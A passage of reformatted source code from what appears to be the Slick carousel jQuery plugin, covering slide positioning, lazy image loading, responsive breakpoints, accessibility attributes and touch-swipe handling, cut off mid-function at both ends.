                null !== t && ((e.$slidesCache = e.$slides), e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.filter(t).appendTo(e.$slideTrack), e.reinit());
            }),
            (i.prototype.focusHandler = function () {
                var e = this;
                e.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*:not(.slick-arrow)", function (i) {
                    i.stopImmediatePropagation();
                    var n = t(this);
                    setTimeout(function () {
                        e.options.pauseOnFocus && ((e.focussed = n.is(":focus")), e.autoPlay());
                    }, 0);
                });
            }),
            (i.prototype.getCurrent = i.prototype.slickCurrentSlide = function () {
                return this.currentSlide;
            }),
            (i.prototype.getDotCount = function () {
                var t = this,
                    e = 0,
                    i = 0,
                    n = 0;
                if (!0 === t.options.infinite) for (; e < t.slideCount; ) ++n, (e = i + t.options.slidesToScroll), (i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow);
                else if (!0 === t.options.centerMode) n = t.slideCount;
                else if (t.options.asNavFor) for (; e < t.slideCount; ) ++n, (e = i + t.options.slidesToScroll), (i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow);
                else n = 1 + Math.ceil((t.slideCount - t.options.slidesToShow) / t.options.slidesToScroll);
                return n - 1;
            }),
            (i.prototype.getLeft = function (t) {
                var e,
                    i,
                    n,
                    s = this,
                    r = 0;
                return (
                    (s.slideOffset = 0),
                    (i = s.$slides.first().outerHeight(!0)),
                    !0 === s.options.infinite
                        ? (s.slideCount > s.options.slidesToShow && ((s.slideOffset = s.slideWidth * s.options.slidesToShow * -1), (r = i * s.options.slidesToShow * -1)),
                          s.slideCount % s.options.slidesToScroll != 0 &&
                              t + s.options.slidesToScroll > s.slideCount &&
                              s.slideCount > s.options.slidesToShow &&
                              (t > s.slideCount
                                  ? ((s.slideOffset = (s.options.slidesToShow - (t - s.slideCount)) * s.slideWidth * -1), (r = (s.options.slidesToShow - (t - s.slideCount)) * i * -1))
                                  : ((s.slideOffset = (s.slideCount % s.options.slidesToScroll) * s.slideWidth * -1), (r = (s.slideCount % s.options.slidesToScroll) * i * -1))))
                        : t + s.options.slidesToShow > s.slideCount && ((s.slideOffset = (t + s.options.slidesToShow - s.slideCount) * s.slideWidth), (r = (t + s.options.slidesToShow - s.slideCount) * i)),
                    s.slideCount <= s.options.slidesToShow && ((s.slideOffset = 0), (r = 0)),
                    !0 === s.options.centerMode && !0 === s.options.infinite
                        ? (s.slideOffset += s.slideWidth * Math.floor(s.options.slidesToShow / 2) - s.slideWidth)
                        : !0 === s.options.centerMode && ((s.slideOffset = 0), (s.slideOffset += s.slideWidth * Math.floor(s.options.slidesToShow / 2))),
                    (e = !1 === s.options.vertical ? t * s.slideWidth * -1 + s.slideOffset : t * i * -1 + r),
                    !0 === s.options.variableWidth &&
                        ((n = s.slideCount <= s.options.slidesToShow || !1 === s.options.infinite ? s.$slideTrack.children(".slick-slide").eq(t) : s.$slideTrack.children(".slick-slide").eq(t + s.options.slidesToShow)),
                        (e = !0 === s.options.rtl ? (n[0] ? -1 * (s.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0) : n[0] ? -1 * n[0].offsetLeft : 0),
                        !0 === s.options.centerMode &&
                            ((n = s.slideCount <= s.options.slidesToShow || !1 === s.options.infinite ? s.$slideTrack.children(".slick-slide").eq(t) : s.$slideTrack.children(".slick-slide").eq(t + s.options.slidesToShow + 1)),
                            (e = !0 === s.options.rtl ? (n[0] ? -1 * (s.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0) : n[0] ? -1 * n[0].offsetLeft : 0),
                            (e += (s.$list.width() - n.outerWidth()) / 2))),
                    e
                );
            }),
            (i.prototype.getOption = i.prototype.slickGetOption = function (t) {
                return this.options[t];
            }),
            (i.prototype.getNavigableIndexes = function () {
                var t,
                    e = this,
                    i = 0,
                    n = 0,
                    s = [];
                for (!1 === e.options.infinite ? (t = e.slideCount) : ((i = -1 * e.options.slidesToScroll), (n = -1 * e.options.slidesToScroll), (t = 2 * e.slideCount)); i < t; )
                    s.push(i), (i = n + e.options.slidesToScroll), (n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow);
                return s;
            }),
            (i.prototype.getSlick = function () {
                return this;
            }),
            (i.prototype.getSlideCount = function () {
                var e,
                    i,
                    n = this;
                return (
                    (i = !0 === n.options.centerMode ? n.slideWidth * Math.floor(n.options.slidesToShow / 2) : 0),
                    !0 === n.options.swipeToSlide
                        ? (n.$slideTrack.find(".slick-slide").each(function (s, r) {
                              if (r.offsetLeft - i + t(r).outerWidth() / 2 > -1 * n.swipeLeft) return (e = r), !1;
                          }),
                          Math.abs(t(e).attr("data-slick-index") - n.currentSlide) || 1)
                        : n.options.slidesToScroll
                );
            }),
            (i.prototype.goTo = i.prototype.slickGoTo = function (t, e) {
                this.changeSlide({ data: { message: "index", index: parseInt(t) } }, e);
            }),
            (i.prototype.init = function (e) {
                var i = this;
                t(i.$slider).hasClass("slick-initialized") ||
                    (t(i.$slider).addClass("slick-initialized"), i.buildRows(), i.buildOut(), i.setProps(), i.startLoad(), i.loadSlider(), i.initializeEvents(), i.updateArrows(), i.updateDots(), i.checkResponsive(!0), i.focusHandler()),
                    e && i.$slider.trigger("init", [i]),
                    !0 === i.options.accessibility && i.initADA(),
                    i.options.autoplay && ((i.paused = !1), i.autoPlay());
            }),
            (i.prototype.initADA = function () {
                var e = this;
                e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({ "aria-hidden": "true", tabindex: "-1" }).find("a, input, button, select").attr({ tabindex: "-1" }),
                    e.$slideTrack.attr("role", "listbox"),
                    e.$slides.not(e.$slideTrack.find(".slick-cloned")).each(function (i) {
                        t(this).attr({ role: "option", "aria-describedby": "slick-slide" + e.instanceUid + i });
                    }),
                    null !== e.$dots &&
                        e.$dots
                            .attr("role", "tablist")
                            .find("li")
                            .each(function (i) {
                                t(this).attr({ role: "presentation", "aria-selected": "false", "aria-controls": "navigation" + e.instanceUid + i, id: "slick-slide" + e.instanceUid + i });
                            })
                            .first()
                            .attr("aria-selected", "true")
                            .end()
                            .find("button")
                            .attr("role", "button")
                            .end()
                            .closest("div")
                            .attr("role", "toolbar"),
                    e.activateADA();
            }),
            (i.prototype.initArrowEvents = function () {
                var t = this;
                !0 === t.options.arrows &&
                    t.slideCount > t.options.slidesToShow &&
                    (t.$prevArrow.off("click.slick").on("click.slick", { message: "previous" }, t.changeSlide), t.$nextArrow.off("click.slick").on("click.slick", { message: "next" }, t.changeSlide));
            }),
            (i.prototype.initDotEvents = function () {
                var e = this;
                !0 === e.options.dots && e.slideCount > e.options.slidesToShow && t("li", e.$dots).on("click.slick", { message: "index" }, e.changeSlide),
                    !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && t("li", e.$dots).on("mouseenter.slick", t.proxy(e.interrupt, e, !0)).on("mouseleave.slick", t.proxy(e.interrupt, e, !1));
            }),
            (i.prototype.initSlideEvents = function () {
                var e = this;
                e.options.pauseOnHover && (e.$list.on("mouseenter.slick", t.proxy(e.interrupt, e, !0)), e.$list.on("mouseleave.slick", t.proxy(e.interrupt, e, !1)));
            }),
            (i.prototype.initializeEvents = function () {
                var e = this;
                e.initArrowEvents(),
                    e.initDotEvents(),
                    e.initSlideEvents(),
                    e.$list.on("touchstart.slick mousedown.slick", { action: "start" }, e.swipeHandler),
                    e.$list.on("touchmove.slick mousemove.slick", { action: "move" }, e.swipeHandler),
                    e.$list.on("touchend.slick mouseup.slick", { action: "end" }, e.swipeHandler),
                    e.$list.on("touchcancel.slick mouseleave.slick", { action: "end" }, e.swipeHandler),
                    e.$list.on("click.slick", e.clickHandler),
                    t(document).on(e.visibilityChange, t.proxy(e.visibility, e)),
                    !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler),
                    !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler),
                    t(window).on("orientationchange.slick.slick-" + e.instanceUid, t.proxy(e.orientationChange, e)),
                    t(window).on("resize.slick.slick-" + e.instanceUid, t.proxy(e.resize, e)),
                    t("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault),
                    t(window).on("load.slick.slick-" + e.instanceUid, e.setPosition),
                    t(document).on("ready.slick.slick-" + e.instanceUid, e.setPosition);
            }),
            (i.prototype.initUI = function () {
                var t = this;
                !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.show(), t.$nextArrow.show()), !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.show();
            }),
            (i.prototype.keyHandler = function (t) {
                var e = this;
                t.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
                    (37 === t.keyCode && !0 === e.options.accessibility
                        ? e.changeSlide({ data: { message: !0 === e.options.rtl ? "next" : "previous" } })
                        : 39 === t.keyCode && !0 === e.options.accessibility && e.changeSlide({ data: { message: !0 === e.options.rtl ? "previous" : "next" } }));
            }),
            (i.prototype.lazyLoad = function () {
                var e,
                    i,
                    n = this;
                function s(e) {
                    t("img[data-lazy]", e).each(function () {
                        var e = t(this),
                            i = t(this).attr("data-lazy"),
                            s = document.createElement("img");
                        (s.onload = function () {
                            e.animate({ opacity: 0 }, 100, function () {
                                e.attr("src", i).animate({ opacity: 1 }, 200, function () {
                                    e.removeAttr("data-lazy").removeClass("slick-loading");
                                }),
                                    n.$slider.trigger("lazyLoaded", [n, e, i]);
                            });
                        }),
                            (s.onerror = function () {
                                e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), n.$slider.trigger("lazyLoadError", [n, e, i]);
                            }),
                            (s.src = i);
                    });
                }
                !0 === n.options.centerMode
                    ? !0 === n.options.infinite
                        ? (i = (e = n.currentSlide + (n.options.slidesToShow / 2 + 1)) + n.options.slidesToShow + 2)
                        : ((e = Math.max(0, n.currentSlide - (n.options.slidesToShow / 2 + 1))), (i = n.options.slidesToShow / 2 + 1 + 2 + n.currentSlide))
                    : ((e = n.options.infinite ? n.options.slidesToShow + n.currentSlide : n.currentSlide), (i = Math.ceil(e + n.options.slidesToShow)), !0 === n.options.fade && (e > 0 && e--, i <= n.slideCount && i++)),
                    s(n.$slider.find(".slick-slide").slice(e, i)),
                    n.slideCount <= n.options.slidesToShow
                        ? s(n.$slider.find(".slick-slide"))
                        : n.currentSlide >= n.slideCount - n.options.slidesToShow
                        ? s(n.$slider.find(".slick-cloned").slice(0, n.options.slidesToShow))
                        : 0 === n.currentSlide && s(n.$slider.find(".slick-cloned").slice(-1 * n.options.slidesToShow));
            }),
            (i.prototype.loadSlider = function () {
                var t = this;
                t.setPosition(), t.$slideTrack.css({ opacity: 1 }), t.$slider.removeClass("slick-loading"), t.initUI(), "progressive" === t.options.lazyLoad && t.progressiveLazyLoad();
            }),
            (i.prototype.next = i.prototype.slickNext = function () {
                this.changeSlide({ data: { message: "next" } });
            }),
            (i.prototype.orientationChange = function () {
                this.checkResponsive(), this.setPosition();
            }),
            (i.prototype.pause = i.prototype.slickPause = function () {
                this.autoPlayClear(), (this.paused = !0);
            }),
            (i.prototype.play = i.prototype.slickPlay = function () {
                var t = this;
                t.autoPlay(), (t.options.autoplay = !0), (t.paused = !1), (t.focussed = !1), (t.interrupted = !1);
            }),
            (i.prototype.postSlide = function (t) {
                var e = this;
                e.unslicked || (e.$slider.trigger("afterChange", [e, t]), (e.animating = !1), e.setPosition(), (e.swipeLeft = null), e.options.autoplay && e.autoPlay(), !0 === e.options.accessibility && e.initADA());
            }),
            (i.prototype.prev = i.prototype.slickPrev = function () {
                this.changeSlide({ data: { message: "previous" } });
            }),
            (i.prototype.preventDefault = function (t) {
                t.preventDefault();
            }),
            (i.prototype.progressiveLazyLoad = function (e) {
                e = e || 1;
                var i,
                    n,
                    s,
                    r = this,
                    o = t("img[data-lazy]", r.$slider);
                o.length
                    ? ((i = o.first()),
                      (n = i.attr("data-lazy")),
                      ((s = document.createElement("img")).onload = function () {
                          i.attr("src", n).removeAttr("data-lazy").removeClass("slick-loading"), !0 === r.options.adaptiveHeight && r.setPosition(), r.$slider.trigger("lazyLoaded", [r, i, n]), r.progressiveLazyLoad();
                      }),
                      (s.onerror = function () {
                          e < 3
                              ? setTimeout(function () {
                                    r.progressiveLazyLoad(e + 1);
                                }, 500)
                              : (i.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), r.$slider.trigger("lazyLoadError", [r, i, n]), r.progressiveLazyLoad());
                      }),
                      (s.src = n))
                    : r.$slider.trigger("allImagesLoaded", [r]);
            }),
            (i.prototype.refresh = function (e) {
                var i,
                    n,
                    s = this;
                (n = s.slideCount - s.options.slidesToShow),
                    !s.options.infinite && s.currentSlide > n && (s.currentSlide = n),
                    s.slideCount <= s.options.slidesToShow && (s.currentSlide = 0),
                    (i = s.currentSlide),
                    s.destroy(!0),
                    t.extend(s, s.initials, { currentSlide: i }),
                    s.init(),
                    e || s.changeSlide({ data: { message: "index", index: i } }, !1);
            }),
            (i.prototype.registerBreakpoints = function () {
                var e,
                    i,
                    n,
                    s = this,
                    r = s.options.responsive || null;
                if ("array" === t.type(r) && r.length) {
                    for (e in ((s.respondTo = s.options.respondTo || "window"), r))
                        if (((n = s.breakpoints.length - 1), (i = r[e].breakpoint), r.hasOwnProperty(e))) {
                            for (; n >= 0; ) s.breakpoints[n] && s.breakpoints[n] === i && s.breakpoints.splice(n, 1), n--;
                            s.breakpoints.push(i), (s.breakpointSettings[i] = r[e].settings);
                        }
                    s.breakpoints.sort(function (t, e) {
                        return s.options.mobileFirst ? t - e : e - t;
                    });
                }
            }),
            (i.prototype.reinit = function () {
                var e = this;
                (e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide")),
                    (e.slideCount = e.$slides.length),
                    e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll),
                    e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0),
                    e.registerBreakpoints(),
                    e.setProps(),
                    e.setupInfinite(),
                    e.buildArrows(),
                    e.updateArrows(),
                    e.initArrowEvents(),
                    e.buildDots(),
                    e.updateDots(),
                    e.initDotEvents(),
                    e.cleanUpSlideEvents(),
                    e.initSlideEvents(),
                    e.checkResponsive(!1, !0),
                    !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler),
                    e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0),
                    e.setPosition(),
                    e.focusHandler(),
                    (e.paused = !e.options.autoplay),
                    e.autoPlay(),
                    e.$slider.trigger("reInit", [e]);
            }),
            (i.prototype.resize = function () {
                var e = this;
                t(window).width() !== e.windowWidth &&
                    (clearTimeout(e.windowDelay),
                    (e.windowDelay = window.setTimeout(function () {
                        (e.windowWidth = t(window).width()), e.checkResponsive(), e.unslicked || e.setPosition();
                    }, 50)));
            }),
            (i.prototype.removeSlide = i.prototype.slickRemove = function (t, e, i) {
                var n = this;
                if (((t = "boolean" == typeof t ? (!0 === (e = t) ? 0 : n.slideCount - 1) : !0 === e ? --t : t), n.slideCount < 1 || t < 0 || t > n.slideCount - 1)) return !1;
                n.unload(),
                    !0 === i ? n.$slideTrack.children().remove() : n.$slideTrack.children(this.options.slide).eq(t).remove(),
                    (n.$slides = n.$slideTrack.children(this.options.slide)),
                    n.$slideTrack.children(this.options.slide).detach(),
                    n.$slideTrack.append(n.$slides),
                    (n.$slidesCache = n.$slides),
                    n.reinit();
            }),
            (i.prototype.setCSS = function (t) {
                var e,
                    i,
                    n = this,
                    s = {};
                !0 === n.options.rtl && (t = -t),
                    (e = "left" == n.positionProp ? Math.ceil(t) + "px" : "0px"),
                    (i = "top" == n.positionProp ? Math.ceil(t) + "px" : "0px"),
                    (s[n.positionProp] = t),
                    !1 === n.transformsEnabled
                        ? n.$slideTrack.css(s)
                        : ((s = {}), !1 === n.cssTransitions ? ((s[n.animType] = "translate(" + e + ", " + i + ")"), n.$slideTrack.css(s)) : ((s[n.animType] = "translate3d(" + e + ", " + i + ", 0px)"), n.$slideTrack.css(s)));
            }),
            (i.prototype.setDimensions = function () {
                var t = this;
                !1 === t.options.vertical
                    ? !0 === t.options.centerMode && t.$list.css({ padding: "0px " + t.options.centerPadding })
                    : (t.$list.height(t.$slides.first().outerHeight(!0) * t.options.slidesToShow), !0 === t.options.centerMode && t.$list.css({ padding: t.options.centerPadding + " 0px" })),
                    (t.listWidth = t.$list.width()),
                    (t.listHeight = t.$list.height()),
                    !1 === t.options.vertical && !1 === t.options.variableWidth
                        ? ((t.slideWidth = Math.ceil(t.listWidth / t.options.slidesToShow)), t.$slideTrack.width(Math.ceil(t.slideWidth * t.$slideTrack.children(".slick-slide").length)))
                        : !0 === t.options.variableWidth
                        ? t.$slideTrack.width(5e3 * t.slideCount)
                        : ((t.slideWidth = Math.ceil(t.listWidth)), t.$slideTrack.height(Math.ceil(t.$slides.first().outerHeight(!0) * t.$slideTrack.children(".slick-slide").length)));
                var e = t.$slides.first().outerWidth(!0) - t.$slides.first().width();
                !1 === t.options.variableWidth && t.$slideTrack.children(".slick-slide").width(t.slideWidth - e);
            }),
            (i.prototype.setFade = function () {
                var e,
                    i = this;
                i.$slides.each(function (n, s) {
                    (e = i.slideWidth * n * -1),
                        !0 === i.options.rtl ? t(s).css({ position: "relative", right: e, top: 0, zIndex: i.options.zIndex - 2, opacity: 0 }) : t(s).css({ position: "relative", left: e, top: 0, zIndex: i.options.zIndex - 2, opacity: 0 });
                }),
                    i.$slides.eq(i.currentSlide).css({ zIndex: i.options.zIndex - 1, opacity: 1 });
            }),
            (i.prototype.setHeight = function () {
                var t = this;
                if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
                    var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
                    t.$list.css("height", e);
                }
            }),
            (i.prototype.setOption = i.prototype.slickSetOption = function () {
                var e,
                    i,
                    n,
                    s,
                    r,
                    o = this,
                    a = !1;
                if (
                    ("object" === t.type(arguments[0])
                        ? ((n = arguments[0]), (a = arguments[1]), (r = "multiple"))
                        : "string" === t.type(arguments[0]) &&
                          ((n = arguments[0]), (s = arguments[1]), (a = arguments[2]), "responsive" === arguments[0] && "array" === t.type(arguments[1]) ? (r = "responsive") : void 0 !== arguments[1] && (r = "single")),
                    "single" === r)
                )
                    o.options[n] = s;
                else if ("multiple" === r)
                    t.each(n, function (t, e) {
                        o.options[t] = e;
                    });
                else if ("responsive" === r)
                    for (i in s)
                        if ("array" !== t.type(o.options.responsive)) o.options.responsive = [s[i]];
                        else {
                            for (e = o.options.responsive.length - 1; e >= 0; ) o.options.responsive[e].breakpoint === s[i].breakpoint && o.options.responsive.splice(e, 1), e--;
                            o.options.responsive.push(s[i]);
                        }
                a && (o.unload(), o.reinit());
            }),
            (i.prototype.setPosition = function () {
                var t = this;
                t.setDimensions(), t.setHeight(), !1 === t.options.fade ? t.setCSS(t.getLeft(t.currentSlide)) : t.setFade(), t.$slider.trigger("setPosition", [t]);
            }),
            (i.prototype.setProps = function () {
                var t = this,
                    e = document.body.style;
                (t.positionProp = !0 === t.options.vertical ? "top" : "left"),
                    "top" === t.positionProp ? t.$slider.addClass("slick-vertical") : t.$slider.removeClass("slick-vertical"),
                    (void 0 === e.WebkitTransition && void 0 === e.MozTransition && void 0 === e.msTransition) || (!0 === t.options.useCSS && (t.cssTransitions = !0)),
                    t.options.fade && ("number" == typeof t.options.zIndex ? t.options.zIndex < 3 && (t.options.zIndex = 3) : (t.options.zIndex = t.defaults.zIndex)),
                    void 0 !== e.OTransform && ((t.animType = "OTransform"), (t.transformType = "-o-transform"), (t.transitionType = "OTransition"), void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)),
                    void 0 !== e.MozTransform &&
                        ((t.animType = "MozTransform"), (t.transformType = "-moz-transform"), (t.transitionType = "MozTransition"), void 0 === e.perspectiveProperty && void 0 === e.MozPerspective && (t.animType = !1)),
                    void 0 !== e.webkitTransform &&
                        ((t.animType = "webkitTransform"), (t.transformType = "-webkit-transform"), (t.transitionType = "webkitTransition"), void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)),
                    void 0 !== e.msTransform && ((t.animType = "msTransform"), (t.transformType = "-ms-transform"), (t.transitionType = "msTransition"), void 0 === e.msTransform && (t.animType = !1)),
                    void 0 !== e.transform && !1 !== t.animType && ((t.animType = "transform"), (t.transformType = "transform"), (t.transitionType = "transition")),
                    (t.transformsEnabled = t.options.useTransform && null !== t.animType && !1 !== t.animType);
            }),
            (i.prototype.setSlideClasses = function (t) {
                var e,
                    i,
                    n,
                    s,
                    r = this;
                (i = r.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true")),
                    r.$slides.eq(t).addClass("slick-current"),
                    !0 === r.options.centerMode
                        ? ((e = Math.floor(r.options.slidesToShow / 2)),
                          !0 === r.options.infinite &&
                              (t >= e && t <= r.slideCount - 1 - e
                                  ? r.$slides
                                        .slice(t - e, t + e + 1)
                                        .addClass("slick-active")
                                        .attr("aria-hidden", "false")
                                  : ((n = r.options.slidesToShow + t),
                                    i
                                        .slice(n - e + 1, n + e + 2)
                                        .addClass("slick-active")
                                        .attr("aria-hidden", "false")),
                              0 === t ? i.eq(i.length - 1 - r.options.slidesToShow).addClass("slick-center") : t === r.slideCount - 1 && i.eq(r.options.slidesToShow).addClass("slick-center")),
                          r.$slides.eq(t).addClass("slick-center"))
                        : t >= 0 && t <= r.slideCount - r.options.slidesToShow
                        ? r.$slides
                              .slice(t, t + r.options.slidesToShow)
                              .addClass("slick-active")
                              .attr("aria-hidden", "false")
                        : i.length <= r.options.slidesToShow
                        ? i.addClass("slick-active").attr("aria-hidden", "false")
                        : ((s = r.slideCount % r.options.slidesToShow),
                          (n = !0 === r.options.infinite ? r.options.slidesToShow + t : t),
                          r.options.slidesToShow == r.options.slidesToScroll && r.slideCount - t < r.options.slidesToShow
                              ? i
                                    .slice(n - (r.options.slidesToShow - s), n + s)
                                    .addClass("slick-active")
                                    .attr("aria-hidden", "false")
                              : i
                                    .slice(n, n + r.options.slidesToShow)
                                    .addClass("slick-active")
                                    .attr("aria-hidden", "false")),
                    "ondemand" === r.options.lazyLoad && r.lazyLoad();
            }),
            (i.prototype.setupInfinite = function () {
                var e,
                    i,
                    n,
                    s = this;
                if ((!0 === s.options.fade && (s.options.centerMode = !1), !0 === s.options.infinite && !1 === s.options.fade && ((i = null), s.slideCount > s.options.slidesToShow))) {
                    for (n = !0 === s.options.centerMode ? s.options.slidesToShow + 1 : s.options.slidesToShow, e = s.slideCount; e > s.slideCount - n; e -= 1)
                        (i = e - 1),
                            t(s.$slides[i])
                                .clone(!0)
                                .attr("id", "")
                                .attr("data-slick-index", i - s.slideCount)
                                .prependTo(s.$slideTrack)
                                .addClass("slick-cloned");
                    for (e = 0; e < n; e += 1)
                        (i = e),
                            t(s.$slides[i])
                                .clone(!0)
                                .attr("id", "")
                                .attr("data-slick-index", i + s.slideCount)
                                .appendTo(s.$slideTrack)
                                .addClass("slick-cloned");
                    s.$slideTrack
                        .find(".slick-cloned")
                        .find("[id]")
                        .each(function () {
                            t(this).attr("id", "");
                        });
                }
            }),
            (i.prototype.interrupt = function (t) {
                t || this.autoPlay(), (this.interrupted = t);
            }),
            (i.prototype.selectHandler = function (e) {
                var i = this,
                    n = t(e.target).is(".slick-slide") ? t(e.target) : t(e.target).parents(".slick-slide"),
                    s = parseInt(n.attr("data-slick-index"));
                if ((s || (s = 0), i.slideCount <= i.options.slidesToShow)) return i.setSlideClasses(s), void i.asNavFor(s);
                i.slideHandler(s);
            }),
            (i.prototype.slideHandler = function (t, e, i) {
                var n,
                    s,
                    r,
                    o,
                    a,
                    l,
                    h = this;
                if (((e = e || !1), (!0 !== h.animating || !0 !== h.options.waitForAnimate) && !((!0 === h.options.fade && h.currentSlide === t) || h.slideCount <= h.options.slidesToShow)))
                    if (
                        (!1 === e && h.asNavFor(t),
                        (n = t),
                        (a = h.getLeft(n)),
                        (o = h.getLeft(h.currentSlide)),
                        (h.currentLeft = null === h.swipeLeft ? o : h.swipeLeft),
                        !1 === h.options.infinite && !1 === h.options.centerMode && (t < 0 || t > h.getDotCount() * h.options.slidesToScroll))
                    )
                        !1 === h.options.fade &&
                            ((n = h.currentSlide),
                            !0 !== i
                                ? h.animateSlide(o, function () {
                                      h.postSlide(n);
                                  })
                                : h.postSlide(n));
                    else if (!1 === h.options.infinite && !0 === h.options.centerMode && (t < 0 || t > h.slideCount - h.options.slidesToScroll))
                        !1 === h.options.fade &&
                            ((n = h.currentSlide),
                            !0 !== i
                                ? h.animateSlide(o, function () {
                                      h.postSlide(n);
                                  })
                                : h.postSlide(n));
                    else {
                        if (
                            (h.options.autoplay && clearInterval(h.autoPlayTimer),
                            (s =
                                n < 0
                                    ? h.slideCount % h.options.slidesToScroll != 0
                                        ? h.slideCount - (h.slideCount % h.options.slidesToScroll)
                                        : h.slideCount + n
                                    : n >= h.slideCount
                                    ? h.slideCount % h.options.slidesToScroll != 0
                                        ? 0
                                        : n - h.slideCount
                                    : n),
                            (h.animating = !0),
                            h.$slider.trigger("beforeChange", [h, h.currentSlide, s]),
                            (r = h.currentSlide),
                            (h.currentSlide = s),
                            h.setSlideClasses(h.currentSlide),
                            h.options.asNavFor && (l = (l = h.getNavTarget()).slick("getSlick")).slideCount <= l.options.slidesToShow && l.setSlideClasses(h.currentSlide),
                            h.updateDots(),
                            h.updateArrows(),
                            !0 === h.options.fade)
                        )
                            return (
                                !0 !== i
                                    ? (h.fadeSlideOut(r),
                                      h.fadeSlide(s, function () {
                                          h.postSlide(s);
                                      }))
                                    : h.postSlide(s),
                                void h.animateHeight()
                            );
                        !0 !== i
                            ? h.animateSlide(a, function () {
                                  h.postSlide(s);
                              })
                            : h.postSlide(s);
                    }
            }),
            (i.prototype.startLoad = function () {
                var t = this;
                !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.hide(), t.$nextArrow.hide()),
                    !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.hide(),
                    t.$slider.addClass("slick-loading");
            }),
            (i.prototype.swipeDirection = function () {
                var t,
                    e,
                    i,
                    n,
                    s = this;
                return (
                    (t = s.touchObject.startX - s.touchObject.curX),
                    (e = s.touchObject.startY - s.touchObject.curY),
                    (i = Math.atan2(e, t)),
                    (n = Math.round((180 * i) / Math.PI)) < 0 && (n = 360 - Math.abs(n)),
                    n <= 45 && n >= 0
                        ? !1 === s.options.rtl
                            ? "left"
                            : "right"
                        : n <= 360 && n >= 315
                        ? !1 === s.options.rtl
                            ? "left"
                            : "right"
                        : n >= 135 && n <= 225
                        ? !1 === s.options.rtl
                            ? "right"
                            : "left"
                        : !0 === s.options.verticalSwiping
                        ? n >= 35 && n <= 135
                            ? "down"
                            : "up"
                        : "vertical"
                );
            }),
            (i.prototype.swipeEnd = function (t) {
                var e,
                    i,
                    n = this;
                if (((n.dragging = !1), (n.interrupted = !1), (n.shouldClick = !(n.touchObject.swipeLength > 10)), void 0 === n.touchObject.curX)) return !1;
                if ((!0 === n.touchObject.edgeHit && n.$slider.trigger("edge", [n, n.swipeDirection()]), n.touchObject.swipeLength >= n.touchObject.minSwipe)) {
                    switch ((i = n.swipeDirection())) {
                        case "left":
                        case "down":
                            (e = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide + n.getSlideCount()) : n.currentSlide + n.getSlideCount()), (n.currentDirection = 0);
                            break;
                        case "right":
                        case "up":
                            (e = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide - n.getSlideCount()) : n.currentSlide - n.getSlideCount()), (n.currentDirection = 1);
                    }
                    "vertical" != i && (n.slideHandler(e), (n.touchObject = {}), n.$slider.trigger("swipe", [n, i]));
                } else n.touchObject.startX !== n.touchObject.curX && (n.slideHandler(n.currentSlide), (n.touchObject = {}));
            }),
            (i.prototype.swipeHandler = function (t) {
                var e = this;
                if (!(!1 === e.options.swipe || ("ontouchend" in document && !1 === e.options.swipe) || (!1 === e.options.draggable && -1 !== t.type.indexOf("mouse"))))
                    switch (
                        ((e.touchObject.fingerCount = t.originalEvent && void 0 !== t.originalEvent.touches ? t.originalEvent.touches.length : 1),
                        (e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold),
                        !0 === e.options.verticalSwiping && (e.touchObject.minSwipe = e.listHeight / e.options.touchThreshold),
                        t.data.action)
                    ) {
                        case "start":
                            e.swipeStart(t);
                            break;
                        case "move":
                            e.swipeMove(t);
                            break;
                        case "end":
                            e.swipeEnd(t);
                    }
            }),
            (i.prototype.swipeMove = function (t) {
                var e,
                    i,
                    n,
                    s,
                    r,
                    o = this;
                return (
                    (r = void 0 !== t.originalEvent ? t.originalEvent.touches : null),
                    !(!o.dragging || (r && 1 !== r.length)) &&
                        ((e = o.getLeft(o.currentSlide)),
                        (o.touchObject.curX = void 0 !== r ? r[0].pageX : t.clientX),
                        (o.touchObject.curY = void 0 !== r ? r[0].pageY : t.clientY),
                        (o.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(o.touchObject.curX - o.touchObject.startX, 2)))),
                        !0 === o.options.verticalSwiping && (o.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(o.touchObject.curY - o.touchObject.startY, 2)))),
                        "vertical" !== (i = o.swipeDirection())
                            ? (void 0 !== t.originalEvent && o.touchObject.swipeLength > 4 && t.preventDefault(),
                              (s = (!1 === o.options.rtl ? 1 : -1) * (o.touchObject.curX > o.touchObject.startX ? 1 : -1)),
                              !0 === o.options.verticalSwiping && (s = o.touchObject.curY > o.touchObject.startY ? 1 : -1),
                              (n = o.touchObject.swipeLength),
                              (o.touchObject.edgeHit = !1),
